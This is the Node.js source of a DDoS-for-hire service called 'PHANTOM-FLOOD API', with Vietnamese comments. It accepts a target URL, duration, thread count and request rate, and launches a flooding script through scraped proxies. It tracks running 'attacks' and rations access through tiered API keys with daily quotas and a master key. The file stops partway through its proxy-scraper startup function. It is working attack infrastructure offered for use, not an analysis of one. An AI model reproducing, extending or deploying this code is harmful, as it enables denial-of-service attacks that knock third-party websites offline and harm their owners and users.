// main.js - API Version với quản lý API Key chi tiết
const express = require("express");
const { spawn } = require("child_process");
const path = require("path");
const fs = require("fs");
const os = require("os");
const cors = require("cors");

// ==================== CẤU HÌNH ====================
const PORT = process.env.PORT || 3000;
const API_KEY_FILE = "apikey.json";
const PROXY_FILE = "proxy.txt";
// =====================================================

const app = express();
app.use(cors());
app.use(express.json());

const activeAttacks = new Map(); // Lưu trữ các cuộc tấn công đang chạy
const apiKeyUsage = new Map(); // Theo dõi sử dụng API key
const rateLimits = new Map(); // Rate limiting

// ==================== HÀM TIỆN ÍCH ====================

// Hàm sinh API key ngẫu nhiên
function generateApiKey() {
  const timestamp = Date.now();
  const randomStr = Math.random().toString(36).substr(2, 8); // 8 ký tự ngẫu nhiên
  return `key_${timestamp}_${randomStr}`;
}

// Format thời gian
function formatDuration(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  return `${h}h ${m}m ${s}s`;
}

// Đọc API keys từ file
function loadApiKeys() {
  try {
    if (fs.existsSync(path.join(__dirname, API_KEY_FILE))) {
      const data = fs.readFileSync(path.join(__dirname, API_KEY_FILE), 'utf8');
      return JSON.parse(data);
    }
  } catch (error) {
    console.error("Lỗi đọc file API key:", error);
  }
  
  // Tạo file mẫu nếu không tồn tại
  const sampleKeys = {
    "master_key": {
      "name": "Master Key (Owner)",
      "max_requests": -1,
      "max_duration": 86400,
      "allowed_options": ["--reset", "--debug", "--randpath", "--close", "--browser", "--browser=1", "--browser=2", "--browser=3", "--browser=4", "--browser=5"],
      "enabled": true,
      "created_at": new Date().toISOString(),
      "is_owner": true
    },
    "key_1739123456789_abc123xyz": {
      "name": "Example User",
      "max_requests": 100,
      "max_duration": 300,
      "allowed_options": ["--reset", "--debug"],
      "enabled": true,
      "created_at": new Date().toISOString(),
      "used_requests": 0,
      "last_reset": "2026-02-10T00:00:00.000Z"
    }
  };
  
  try {
    fs.writeFileSync(
      path.join(__dirname, API_KEY_FILE),
      JSON.stringify(sampleKeys, null, 2),
      'utf8'
    );
    console.log("Đã tạo file API key mẫu:", API_KEY_FILE);
  } catch (error) {
    console.error("Lỗi tạo file API key:", error);
  }
  
  return sampleKeys;
}

// Lưu API keys
function saveApiKeys(apiKeys) {
  try {
    fs.writeFileSync(
      path.join(__dirname, API_KEY_FILE),
      JSON.stringify(apiKeys, null, 2),
      'utf8'
    );
    return true;
  } catch (error) {
    console.error("Lỗi lưu file API key:", error);
    return false;
  }
}

// Parse arguments với hỗ trợ quotes (giữ từ bot cũ)
function parseArgs(str) {
  const args = [];
  let current = "";
  let inQuotes = false;
  let quoteChar = "";

  for (let i = 0; i < str.length; i++) {
    const char = str[i];

    if ((char === '"' || char === "'") && !inQuotes) {
      inQuotes = true;
      quoteChar = char;
    } else if (char === quoteChar && inQuotes) {
      inQuotes = false;
      quoteChar = "";
    } else if (char === " " && !inQuotes) {
      if (current.trim()) {
        args.push(current.trim());
      }
      current = "";
    } else {
      current += char;
    }
  }

  if (current.trim()) {
    args.push(current.trim());
  }

  return args;
}

// Kiểm tra options có được phép không
function validateOptions(providedOptions, allowedOptions) {
  if (!providedOptions || providedOptions.length === 0) {
    return { valid: true, invalidOptions: [] };
  }
  
  const invalidOptions = [];
  const allowedOptionsSet = new Set(allowedOptions);
  
  for (const option of providedOptions) {
    let isValid = false;
    
    // Kiểm tra option đơn giản (--name)
    if (allowedOptionsSet.has(option)) {
      isValid = true;
    } 
    // Kiểm tra option có giá trị (--name=value)
    else if (option.includes('=')) {
      const [optionName, optionValue] = option.split('=');
      
      // Kiểm tra nếu cho phép tất cả giá trị (--browser=*)
      if (allowedOptionsSet.has(`${optionName}=*`)) {
        isValid = true;
      }
      // Kiểm tra giá trị cụ thể
      else if (allowedOptionsSet.has(option)) {
        isValid = true;
      }
      // Kiểm tra giá trị số trong khoảng cho phép
      else if (optionName === "--browser" && !isNaN(optionValue)) {
        const value = parseInt(optionValue);
        // Cho phép --browser=1 đến --browser=5
        for (let i = 1; i <= 5; i++) {
          if (allowedOptionsSet.has(`${optionName}=${i}`)) {
            isValid = true;
            break;
          }
        }
      }
    }
    
    if (!isValid) {
      invalidOptions.push(option);
    }
  }
  
  return {
    valid: invalidOptions.length === 0,
    invalidOptions
  };
}

// ==================== MIDDLEWARE ====================

// Middleware kiểm tra API key với rate limiting
function checkApiKey(req, res, next) {
  const apiKey = req.headers["x-api-key"] || req.query.api_key;
  
  if (!apiKey) {
    return res.status(401).json({
      success: false,
      message: "API key is required",
      code: "API_KEY_MISSING"
    });
  }
  
  const apiKeys = loadApiKeys();
  
  if (!apiKeys[apiKey]) {
    return res.status(403).json({
      success: false,
      message: "Invalid API key",
      code: "API_KEY_INVALID"
    });
  }
  
  const keyInfo = apiKeys[apiKey];
  
  // Kiểm tra key có enabled không
  if (!keyInfo.enabled) {
    return res.status(403).json({
      success: false,
      message: "API key is disabled",
      code: "API_KEY_DISABLED"
    });
  }
  
  // Kiểm tra rate limiting
  const now = Date.now();
  const clientIP = req.ip || req.connection.remoteAddress;
  const rateKey = `${apiKey}_${clientIP}`;
  
  if (!rateLimits.has(rateKey)) {
    rateLimits.set(rateKey, {
      count: 0,
      firstRequest: now,
      lastRequest: now
    });
  }
  
  const rateLimit = rateLimits.get(rateKey);
  const timeWindow = 60 * 1000; // 1 phút
  
  // Reset counter nếu quá time window
  if (now - rateLimit.firstRequest > timeWindow) {
    rateLimit.count = 0;
    rateLimit.firstRequest = now;
  }
  
  // Giới hạn 60 requests/phút mặc định cho mỗi IP+Key
  if (rateLimit.count >= 60) {
    return res.status(429).json({
      success: false,
      message: "Rate limit exceeded. Maximum 60 requests per minute",
      code: "RATE_LIMIT_EXCEEDED",
      retry_after: Math.ceil((timeWindow - (now - rateLimit.firstRequest)) / 1000)
    });
  }
  
  rateLimit.count++;
  rateLimit.lastRequest = now;
  
  // Kiểm tra số lượng request tối đa (chỉ với key không phải master)
  if (apiKey !== "master_key" && keyInfo.max_requests !== -1) {
    if (!keyInfo.used_requests) {
      keyInfo.used_requests = 0;
    }
    
    // Reset hàng ngày
    if (keyInfo.last_reset) {
      const lastReset = new Date(keyInfo.last_reset);
      const nowDate = new Date();
      if (nowDate.getDate() !== lastReset.getDate() || 
          nowDate.getMonth() !== lastReset.getMonth() || 
          nowDate.getFullYear() !== lastReset.getFullYear()) {
        keyInfo.used_requests = 0;
        keyInfo.last_reset = nowDate.toISOString();
        saveApiKeys(apiKeys);
      }
    }
    
    if (keyInfo.used_requests >= keyInfo.max_requests) {
      return res.status(403).json({
        success: false,
        message: `Daily request limit exceeded. Maximum ${keyInfo.max_requests} requests per day`,
        code: "DAILY_LIMIT_EXCEEDED",
        used: keyInfo.used_requests,
        limit: keyInfo.max_requests
      });
    }
  }
  
  // Lưu thông tin API key vào request để sử dụng sau
  req.apiKeyInfo = keyInfo;
  req.apiKeyValue = apiKey;
  req.clientIP = clientIP;
  
  next();
}

// ==================== API ROUTES ====================

// API chính
app.get("/", (req, res) => {
  res.json({
    success: true,
    message: "🔥 PHANTOM-FLOOD API 🔥",
    version: "2.0.0",
    features: [
      "Quản lý API Key chi tiết",
      "Rate limiting thông minh",
      "Giới hạn request/ngày",
      "Kiểm soát thời gian tấn công",
      "Filter options theo API Key",
      "Auto proxy scraper"
    ],
    endpoints: {
      start: "POST /api/flood",
      stop: "GET /api/stop",
      status: "GET /api/status",
      proxy: "GET /api/proxy",
      update_proxy: "GET /api/proxy/update",
      keys: "GET /api/keys",
      keys_all: "GET /api/keys/all (master only)",
      create_key: "POST /api/keys",
      update_key: "POST /api/keys/update",
      set_reset_date: "POST /api/keys/set-reset-date",
      set_date_all: "POST /api/keys/set-date-all",
      toggle_options: "POST /api/keys/toggle-options",
      remove_option: "POST /api/keys/remove-option",
      system: "GET /api/system",
      help: "GET /api/help"
    }
  });
});

// API Help
app.get("/api/help", checkApiKey, (req, res) => {
  const keyInfo = req.apiKeyInfo;
  
  res.json({
    success: true,
    message: "Hướng dẫn sử dụng API",
    your_key_info: {
      name: keyInfo.name,
      max_duration: keyInfo.max_duration,
      max_requests: keyInfo.max_requests,
      allowed_options: keyInfo.allowed_options,
      used_requests: keyInfo.used_requests || 0
    },
    syntax: {
      flood: "POST /api/flood với JSON body",
      parameters: {
        target: "URL mục tiêu (https://...) - Bắt buộc",
        time: `Thời gian tấn công (giây) - Tối đa: ${keyInfo.max_duration}s - Bắt buộc`,
        threads: "Số luồng (1-100) - Bắt buộc",
        ratelimit: "Giới hạn request/giây (>=1) - Bắt buộc",
        proxy_file: "File proxy (tùy chọn, mặc định: proxy.txt)",
        options: `Mảng các tùy chọn - Chỉ được phép: ${keyInfo.allowed_options.join(', ') || 'Không có options nào được phép'}`
      },
      example: {
        target: "https://target.com",
        time: 120,
        threads: 10,
        ratelimit: 90,
        options: keyInfo.allowed_options.length > 0 ? [keyInfo.allowed_options[0]] : []
      }
    }
  });
});

// API Bắt đầu tấn công
app.post("/api/flood", checkApiKey, (req, res) => {
  const { target, time, threads, ratelimit, proxy_file, options = [] } = req.body;
  const keyInfo = req.apiKeyInfo;
  const apiKey = req.apiKeyValue;
  
  // Validate required fields
  if (!target || !time || !threads || !ratelimit) {
    return res.status(400).json({
      success: false,
      message: "Thiếu tham số. Cần: target, time, threads, ratelimit",
      code: "MISSING_PARAMETERS"
    });
  }
  
  // Validate target
  if (!target.startsWith("https://")) {
    return res.status(400).json({
      success: false,
      message: "Target phải bắt đầu bằng https://",
      code: "INVALID_TARGET"
    });
  }
  
  // Validate time với giới hạn của API key
  if (isNaN(time) || time < 1) {
    return res.status(400).json({
      success: false,
      message: "Thời gian phải >= 1 giây",
      code: "INVALID_TIME"
    });
  }
  
  if (time > keyInfo.max_duration) {
    return res.status(400).json({
      success: false,
      message: `Thời gian vượt quá giới hạn của API key. Tối đa: ${keyInfo.max_duration} giây`,
      code: "TIME_LIMIT_EXCEEDED",
      max_duration: keyInfo.max_duration
    });
  }
  
  // Validate threads
  if (isNaN(threads) || threads < 1 || threads > 100) {
    return res.status(400).json({
      success: false,
      message: "Threads phải từ 1-100",
      code: "INVALID_THREADS"
    });
  }
  
  // Validate ratelimit
  if (isNaN(ratelimit) || ratelimit < 1) {
    return res.status(400).json({
      success: false,
      message: "Ratelimit phải >= 1",
      code: "INVALID_RATELIMIT"
    });
  }
  
  // Validate options
  const optionsValidation = validateOptions(options, keyInfo.allowed_options || []);
  if (!optionsValidation.valid) {
    return res.status(400).json({
      success: false,
      message: `Options không được phép: ${optionsValidation.invalidOptions.join(', ')}`,
      code: "INVALID_OPTIONS",
      allowed_options: keyInfo.allowed_options,
      invalid_options: optionsValidation.invalidOptions
    });
  }
  
  // Xác định proxy file
  const proxyFile = proxy_file || PROXY_FILE;
  const proxyPath = path.join(__dirname, proxyFile);
  
  // Kiểm tra proxy file tồn tại
  if (!fs.existsSync(proxyPath)) {
    return res.status(400).json({
      success: false,
      message: `Không tìm thấy file proxy: ${proxyFile}`,
      code: "PROXY_FILE_NOT_FOUND"
    });
  }
  
  // Tăng số lượng request đã sử dụng (trừ master key)
  const apiKeys = loadApiKeys();
  if (apiKey !== "master_key" && apiKeys[apiKey]) {
    if (!apiKeys[apiKey].used_requests) {
      apiKeys[apiKey].used_requests = 0;
    }
    apiKeys[apiKey].used_requests++;
    apiKeys[apiKey].last_used = new Date().toISOString();
    saveApiKeys(apiKeys);
  }
  
  // Build command
  const phantomPath = path.join(__dirname, "script.js");
  const cmdArgs = [
    phantomPath,
    target,
    time.toString(),
    threads.toString(),
    ratelimit.toString(),
    proxyFile,
    ...options
  ];
  
  // Tạo ID cho cuộc tấn công
  const attackId = `attack_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
  
  // Spawn process
  const child = spawn("node", cmdArgs, {
    cwd: __dirname,
    stdio: ["ignore", "pipe", "pipe"],
    detached: true,
    env: { ...process.env, FORCE_COLOR: "0" }
  });
  
  // Lưu thông tin attack
  activeAttacks.set(attackId, {
    process: child,
    target,
    startTime: Date.now(),
    duration: time,
    apiKey: apiKey,
    clientIP: req.clientIP,
    outputBuffer: "",
    status: "running",
    options: options
  });
  
  // Lưu output vào buffer
  let outputBuffer = "";
  
  child.stdout.on("data", (data) => {
    outputBuffer += data.toString();
    const attack = activeAttacks.get(attackId);
    if (attack) {
      attack.outputBuffer = outputBuffer;
    }
  });
  
  child.stderr.on("data", (data) => {
    outputBuffer += data.toString();
    const attack = activeAttacks.get(attackId);
    if (attack) {
      attack.outputBuffer = outputBuffer;
    }
  });
  
  // Xử lý khi process kết thúc
  child.on("close", (code) => {
    const attack = activeAttacks.get(attackId);
    if (attack) {
      attack.status = code === 0 ? "completed" : "failed";
      attack.exitCode = code;
      attack.endTime = Date.now();
      attack.durationActual = Math.floor((attack.endTime - attack.startTime) / 1000);
    }
  });
  
  child.on("error", (err) => {
    const attack = activeAttacks.get(attackId);
    if (attack) {
      attack.status = "error";
      attack.error = err.message;
    }
  });
  
  // Auto stop sau thời gian duration
  setTimeout(() => {
    if (activeAttacks.has(attackId)) {
      const attack = activeAttacks.get(attackId);
      if (attack && attack.status === "running") {
        if (attack.process && attack.process.pid) {
          try {
            process.kill(-attack.process.pid, "SIGINT");
          } catch (e) {
            try {
              attack.process.kill("SIGINT");
            } catch (e) {}
          }
        }
        attack.status = "auto_stopped";
      }
    }
  }, (time + 10) * 1000);
  
  // Trả về response
  res.json({
    success: true,
    message: "Bắt đầu tấn công thành công",
    attack_id: attackId,
    api_key_usage: apiKey !== "master_key" ? {
      used_today: apiKeys[apiKey]?.used_requests || 0,
      max_per_day: apiKeys[apiKey]?.max_requests || "unlimited",
      remaining: apiKeys[apiKey]?.max_requests === -1 ? "unlimited" : (apiKeys[apiKey]?.max_requests - (apiKeys[apiKey]?.used_requests || 0))
    } : null,
    details: {
      target,
      time: formatDuration(time),
      threads,
      ratelimit,
      proxy_file: proxyFile,
      options: options,
      estimated_end: new Date(Date.now() + time * 1000).toISOString(),
      api_key_limits: {
        max_duration: formatDuration(keyInfo.max_duration),
        allowed_options: keyInfo.allowed_options
      }
    }
  });
});

// API Dừng tấn công
app.get("/api/stop", checkApiKey, (req, res) => {
  const { attack_id, all } = req.query;
  const apiKey = req.apiKeyValue;
  
  let stoppedCount = 0;
  const stoppedAttacks = [];
  
  if (attack_id) {
    // Dừng attack cụ thể
    const attack = activeAttacks.get(attack_id);
    if (attack && attack.apiKey === apiKey) {
      try {
        const pid = attack.process.pid;
        if (pid) {
          try {
            process.kill(-pid, "SIGINT");
          } catch (e) {
            attack.process.kill("SIGINT");
          }
        }
        attack.status = "stopped";
        stoppedCount++;
        stoppedAttacks.push(attack_id);
      } catch (e) {
        console.error("Lỗi khi dừng attack:", e);
      }
    } else if (attack) {
      return res.status(403).json({
        success: false,
        message: "Bạn không có quyền dừng cuộc tấn công này"
      });
    }
  } else if (all === "true") {
    // Dừng tất cả attacks của API key này
    for (const [id, attack] of activeAttacks) {
      if (attack.apiKey === apiKey) {
        try {
          const pid = attack.process.pid;
          if (pid) {
            try {
              process.kill(-pid, "SIGINT");
            } catch (e) {
              attack.process.kill("SIGINT");
            }
          }
          attack.status = "stopped";
          stoppedCount++;
          stoppedAttacks.push(id);
        } catch (e) {
          console.error("Lỗi khi dừng attack:", e);
        }
      }
    }
  } else {
    return res.status(400).json({
      success: false,
      message: "Cần cung cấp attack_id hoặc all=true"
    });
  }
  
  res.json({
    success: true,
    message: stoppedCount > 0 ? `Đã dừng ${stoppedCount} cuộc tấn công` : "Không tìm thấy cuộc tấn công nào",
    stopped_count: stoppedCount,
    stopped_attacks: stoppedAttacks
  });
});

// API Trạng thái
app.get("/api/status", checkApiKey, (req, res) => {
  const { attack_id } = req.query;
  const apiKey = req.apiKeyValue;
  
  if (attack_id) {
    // Trạng thái của attack cụ thể
    const attack = activeAttacks.get(attack_id);
    if (!attack) {
      return res.status(404).json({
        success: false,
        message: "Không tìm thấy cuộc tấn công với ID này"
      });
    }
    
    if (attack.apiKey !== apiKey) {
      return res.status(403).json({
        success: false,
        message: "Bạn không có quyền xem cuộc tấn công này"
      });
    }
    
    const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
    const remaining = Math.max(0, attack.duration - elapsed);
    
    res.json({
      success: true,
      attack_id,
      status: attack.status || "running",
      details: {
        target: attack.target,
        elapsed: formatDuration(elapsed),
        remaining: formatDuration(remaining),
        start_time: new Date(attack.startTime).toISOString(),
        duration: formatDuration(attack.duration),
        options: attack.options || [],
        actual_duration: attack.durationActual ? formatDuration(attack.durationActual) : null
      },
      output_preview: attack.outputBuffer ? 
        attack.outputBuffer.split("\n").slice(-20).join("\n").slice(-1000) : ""
    });
  } else {
    // Tất cả attacks của API key này
    const attacks = [];
    
    for (const [id, attack] of activeAttacks) {
      if (attack.apiKey === apiKey) {
        const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
        const remaining = Math.max(0, attack.duration - elapsed);
        
        attacks.push({
          id,
          target: attack.target,
          status: attack.status || "running",
          elapsed: formatDuration(elapsed),
          remaining: formatDuration(remaining),
          start_time: new Date(attack.startTime).toISOString(),
          options: attack.options || []
        });
      }
    }
    
    // System info
    const systemInfo = {
      cpu_load: os.loadavg().map(l => l.toFixed(2)),
      memory_usage: ((1 - os.freemem() / os.totalmem()) * 100).toFixed(1),
      memory_total_gb: (os.totalmem() / 1024 / 1024 / 1024).toFixed(2),
      memory_used_gb: ((os.totalmem() - os.freemem()) / 1024 / 1024 / 1024).toFixed(2),
      uptime: formatDuration(os.uptime()),
      active_attacks: attacks.length,
      active_attacks_total: activeAttacks.size
    };
    
    res.json({
      success: true,
      your_attacks: attacks.length,
      attacks,
      system: systemInfo
    });
  }
});

// API Quản lý API Keys - Xem key của mình
app.get("/api/keys", checkApiKey, (req, res) => {
  const apiKey = req.apiKeyValue;
  const apiKeys = loadApiKeys();
  
  if (apiKeys[apiKey]) {
    const keyInfo = { ...apiKeys[apiKey] };
    
    res.json({
      success: true,
      your_key: {
        api_key: apiKey,
        name: keyInfo.name,
        max_requests: keyInfo.max_requests,
        max_duration: keyInfo.max_duration,
        allowed_options: keyInfo.allowed_options,
        enabled: keyInfo.enabled,
        used_requests: keyInfo.used_requests || 0,
        last_reset: keyInfo.last_reset,
        created_at: keyInfo.created_at
      }
    });
  } else {
    res.status(404).json({
      success: false,
      message: "API key không tồn tại"
    });
  }
});

// API Tạo API Key mới (chỉ cho master key)
app.post("/api/keys", checkApiKey, (req, res) => {
  const apiKey = req.apiKeyValue;
  const { name, max_requests, max_duration, allowed_options } = req.body;
  
  // Chỉ master key mới có quyền tạo key mới
  if (apiKey !== "master_key") {
    return res.status(403).json({
      success: false,
      message: "Chỉ master key mới có quyền tạo API key mới"
    });
  }
  
  if (!name) {
    return res.status(400).json({
      success: false,
      message: "Thiếu tên cho API key"
    });
  }
  
  // Tạo key mới
  const newKey = generateApiKey();
  const apiKeys = loadApiKeys();
  
  apiKeys[newKey] = {
    name: name,
    max_requests: max_requests || 50,
    max_duration: max_duration || 600,
    allowed_options: allowed_options || ["--reset", "--debug"],
    enabled: true,
    created_at: new Date().toISOString(),
    created_by: apiKey,
    used_requests: 0,
    last_reset: new Date().toISOString()
  };
  
  saveApiKeys(apiKeys);
  
  res.json({
    success: true,
    message: "Đã tạo API key mới",
    api_key: newKey,
    key_info: apiKeys[newKey],
    warning: "⚠️ Lưu API key này ngay! Nó chỉ hiển thị một lần duy nhất.",
    note: "Sử dụng api_key này trong header X-API-Key hoặc query parameter api_key"
  });
});

// API Xem tất cả keys (chỉ master)
app.get("/api/keys/all", checkApiKey, (req, res) => {
  const apiKey = req.apiKeyValue;
  
  if (apiKey !== "master_key") {
    return res.status(403).json({
      success: false,
      message: "Chỉ master key mới có quyền xem tất cả keys"
    });
  }
  
  const apiKeys = loadApiKeys();
  const keysList = [];
  
  Object.keys(apiKeys).forEach(key => {
    if (key !== "master_key") { // Không hiển thị master key
      keysList.push({
        api_key: key,
        name: apiKeys[key].name,
        max_requests: apiKeys[key].max_requests,
        used_requests: apiKeys[key].used_requests || 0,
        max_duration: apiKeys[key].max_duration,
        allowed_options: apiKeys[key].allowed_options,
        enabled: apiKeys[key].enabled,
        created_at: apiKeys[key].created_at,
        last_reset: apiKeys[key].last_reset,
        last_used: apiKeys[key].last_used || "Chưa dùng"
      });
    }
  });
  
  res.json({
    success: true,
    total_keys: keysList.length,
    keys: keysList
  });
});

// API Chỉnh sửa/cập nhật API Key (chỉ master key)
app.post("/api/keys/update", checkApiKey, (req, res) => {
  const apiKey = req.apiKeyValue;
  const { target_key, updates } = req.body;
  
  // Chỉ master key mới có quyền chỉnh sửa
  if (apiKey !== "master_key") {
    return res.status(403).json({
      success: false,
      message: "Chỉ master key mới có quyền chỉnh sửa API keys"
    });
  }
  
  if (!target_key || !updates) {
    return res.status(400).json({
      success: false,
      message: "Thiếu target_key hoặc updates"
    });
  }
  
  const apiKeys = loadApiKeys();
  
  if (!apiKeys[target_key]) {
    return res.status(404).json({
      success: false,
      message: "Không tìm thấy API key cần chỉnh sửa"
    });
  }
  
  // Cập nhật thông tin
  Object.keys(updates).forEach(key => {
    if (key !== "api_key" && key !== "created_at") {
      apiKeys[target_key][key] = updates[key];
    }
  });
  
  saveApiKeys(apiKeys);
  
  res.json({
    success: true,
    message: `Đã cập nhật API key: ${target_key}`,
    updated_key: apiKeys[target_key]
  });
});

// API Set custom last_reset cho specific key
app.post("/api/keys/set-reset-date", checkApiKey, (req, res) => {
  const apiKey = req.apiKeyValue;
  const { target_key, reset_date, reset_requests = true } = req.body;
  
  // Chỉ master key mới có quyền
  if (apiKey !== "master_key") {
    return res.status(403).json({
      success: false,
      message: "Chỉ master key mới có quyền đặt reset date"
    });
  }
  
  if (!target_key || !reset_date) {
    return res.status(400).json({
      success: false,
      message: "Thiếu target_key hoặc reset_date"
    });
  }
  
  // Validate date format
  const dateRegex = /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z$/;
  if (!dateRegex.test(reset_date)) {
    return res.status(400).json({
      success: false,
      message: "Date format không đúng. Phải là: YYYY-MM-DDTHH:mm:ss.sssZ",
      example: "2026-02-10T00:00:00.000Z"
    });
  }
  
  const apiKeys = loadApiKeys();
  
  if (!apiKeys[target_key]) {
    return res.status(404).json({
      success: false,
      message: "Không tìm thấy API key"
    });
  }
  
  // Cập nhật
  apiKeys[target_key].last_reset = reset_date;
  
  if (reset_requests) {
    apiKeys[target_key].used_requests = 0;
  }
  
  saveApiKeys(apiKeys);
  
  res.json({
    success: true,
    message: `Đã cập nhật last_reset cho ${target_key}`,
    key_info: {
      name: apiKeys[target_key].name,
      last_reset: apiKeys[target_key].last_reset,
      used_requests: apiKeys[target_key].used_requests
    }
  });
});

// API Set date cho tất cả keys
app.post("/api/keys/set-date-all", checkApiKey, (req, res) => {
  const apiKey = req.apiKeyValue;
  const { reset_date, reset_requests = true } = req.body;
  
  // Chỉ master key
  if (apiKey !== "master_key") {
    return res.status(403).json({
      success: false,
      message: "Chỉ master key mới có quyền"
    });
  }
  
  const targetDate = reset_date || "2026-02-10T00:00:00.000Z";
  const dateRegex = /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z$/;
  
  if (!dateRegex.test(targetDate)) {
    return res.status(400).json({
      success: false,
      message: "Date format không đúng",
      required_format: "YYYY-MM-DDTHH:mm:ss.sssZ",
      example: "2026-02-10T00:00:00.000Z"
    });
  }
  
  const apiKeys = loadApiKeys();
  const results = [];
  let updatedCount = 0;
  
  Object.keys(apiKeys).forEach(key => {
    const keyInfo = apiKeys[key];
    const before = {
      last_reset: keyInfo.last_reset,
      used_requests: keyInfo.used_requests || 0
    };
    
    keyInfo.last_reset = targetDate;
    
    if (reset_requests) {
      keyInfo.used_requests = 0;
    }
    
    updatedCount++;
    results.push({
      key: key,
      name: keyInfo.name,
      before: before,
      after: {
        last_reset: keyInfo.last_reset,
        used_requests: keyInfo.used_requests || 0
      }
    });
  });
  
  saveApiKeys(apiKeys);
  
  res.json({
    success: true,
    message: `Đã cập nhật ${updatedCount} keys về date: ${targetDate}`,
    reset_date: targetDate,
    reset_requests: reset_requests,
    updated_count: updatedCount,
    results: results
  });
});

// API để tắt/bật options cho key
app.post("/api/keys/toggle-options", checkApiKey, (req, res) => {
  const apiKey = req.apiKeyValue;
  const { target_key, disable_all_options = false, allowed_options } = req.body;
  
  // Chỉ master key
  if (apiKey !== "master_key") {
    return res.status(403).json({
      success: false,
      message: "Chỉ master key mới có quyền thay đổi options"
    });
  }
  
  if (!target_key) {
    return res.status(400).json({
      success: false,
      message: "Thiếu target_key"
    });
  }
  
  const apiKeys = loadApiKeys();
  
  if (!apiKeys[target_key]) {
    return res.status(404).json({
      success: false,
      message: "Không tìm thấy API key"
    });
  }
  
  if (disable_all_options) {
    // TẮT tất cả options
    apiKeys[target_key].allowed_options = [];
    apiKeys[target_key].note = "Đã tắt tất cả options";
  } else if (allowed_options && Array.isArray(allowed_options)) {
    // Set options cụ thể
    apiKeys[target_key].allowed_options = allowed_options;
  }
  
  saveApiKeys(apiKeys);
  
  res.json({
    success: true,
    message: `Đã cập nhật options cho ${target_key}`,
    key_info: {
      name: apiKeys[target_key].name,
      allowed_options: apiKeys[target_key].allowed_options,
      max_duration: apiKeys[target_key].max_duration,
      max_requests: apiKeys[target_key].max_requests
    }
  });
});

// API để xóa một option khỏi key
app.post("/api/keys/remove-option", checkApiKey, (req, res) => {
  const apiKey = req.apiKeyValue;
  const { target_key, option_to_remove } = req.body;
  
  if (apiKey !== "master_key") {
    return res.status(403).json({
      success: false,
      message: "Chỉ master key"
    });
  }
  
  if (!target_key || !option_to_remove) {
    return res.status(400).json({
      success: false,
      message: "Thiếu target_key hoặc option_to_remove"
    });
  }
  
  const apiKeys = loadApiKeys();
  
  if (!apiKeys[target_key]) {
    return res.status(404).json({
      success: false,
      message: "Không tìm thấy API key"
    });
  }
  
  // Xóa option khỏi danh sách
  const index = apiKeys[target_key].allowed_options.indexOf(option_to_remove);
  if (index !== -1) {
    apiKeys[target_key].allowed_options.splice(index, 1);
    saveApiKeys(apiKeys);
    
    res.json({
      success: true,
      message: `Đã xóa option '${option_to_remove}' khỏi ${target_key}`,
      remaining_options: apiKeys[target_key].allowed_options
    });
  } else {
    res.json({
      success: false,
      message: `Option '${option_to_remove}' không tồn tại trong key`,
      current_options: apiKeys[target_key].allowed_options
    });
  }
});

// API Xem proxy
app.get("/api/proxy", checkApiKey, (req, res) => {
  const proxyPath = path.join(__dirname, PROXY_FILE);
  
  if (!fs.existsSync(proxyPath)) {
    return res.status(404).json({
      success: false,
      message: "File proxy chưa tồn tại"
    });
  }
  
  fs.readFile(proxyPath, "utf8", (err, data) => {
    if (err) {
      return res.status(500).json({
        success: false,
        message: "Lỗi đọc file proxy"
      });
    }
    
    const lines = data.split("\n").filter(l => l.trim());
    const count = lines.length;
    const preview = lines.slice(0, 15).join("\n");
    
    res.json({
      success: true,
      count,
      preview,
      has_more: count > 15
    });
  });
});

// API Cập nhật proxy
app.get("/api/proxy/update", checkApiKey, (req, res) => {
  const proxyScript = path.join(__dirname, "proxy.js");
  
  if (!fs.existsSync(proxyScript)) {
    return res.status(404).json({
      success: false,
      message: "Không tìm thấy file proxy.js"
    });
  }
  
  const child = spawn("node", [proxyScript], { cwd: __dirname });
  
  let stdout = "";
  let stderr = "";
  
  child.stdout.on("data", data => stdout += data.toString());
  child.stderr.on("data", data => stderr += data.toString());
  
  child.on("close", (code) => {
    if (code === 0) {
      const proxyPath = path.join(__dirname, PROXY_FILE);
      if (fs.existsSync(proxyPath)) {
        const count = fs.readFileSync(proxyPath, "utf8")
          .split("\n")
          .filter(l => l.trim()).length;
        
        res.json({
          success: true,
          message: "Đã cập nhật proxy thành công",
          proxy_count: count,
          output: stdout.slice(-500)
        });
      } else {
        res.json({
          success: false,
          message: "Đã chạy xong nhưng không thấy file proxy",
          output: stdout
        });
      }
    } else {
      res.status(500).json({
        success: false,
        message: "Lỗi khi cập nhật proxy",
        exit_code: code,
        error: stderr.slice(-500)
      });
    }
  });
  
  child.on("error", (err) => {
    res.status(500).json({
      success: false,
      message: "Lỗi thực thi proxy scraper",
      error: err.message
    });
  });
});

// API System info
app.get("/api/system", checkApiKey, (req, res) => {
  const apiKey = req.apiKeyValue;
  const apiKeys = loadApiKeys();
  const keyInfo = apiKeys[apiKey] || {};
  
  const systemInfo = {
    platform: os.platform(),
    arch: os.arch(),
    cpu: {
      cores: os.cpus().length,
      model: os.cpus()[0]?.model || "Unknown"
    },
    memory: {
      total: (os.totalmem() / 1024 / 1024 / 1024).toFixed(2) + " GB",
      free: (os.freemem() / 1024 / 1024 / 1024).toFixed(2) + " GB",
      used_percent: ((1 - os.freemem() / os.totalmem()) * 100).toFixed(1) + "%"
    },
    load: os.loadavg(),
    uptime: formatDuration(os.uptime()),
    active_attacks: activeAttacks.size,
    your_active_attacks: Array.from(activeAttacks.values()).filter(a => a.apiKey === apiKey).length
  };
  
  res.json({
    success: true,
    system: systemInfo,
    your_key: {
      name: keyInfo.name,
      max_duration: keyInfo.max_duration,
      max_requests: keyInfo.max_requests,
      used_requests: keyInfo.used_requests || 0,
      remaining_requests: keyInfo.max_requests === -1 ? "unlimited" : (keyInfo.max_requests - (keyInfo.used_requests || 0)),
      allowed_options: keyInfo.allowed_options || [],
      last_reset: keyInfo.last_reset
    }
  });
});

// ==================== TỰ ĐỘNG SCRAPER ====================

// Tự động chạy proxy scraper
function startProxyScraper() {
  const proxyScript = path.join(__dirname, "proxy.js");
  
  if (!fs.existsSync(proxyScript)) {
    console.warn("[WARN] Không tìm thấy proxy.js, bỏ qua auto scraper");
    return;
  }
  
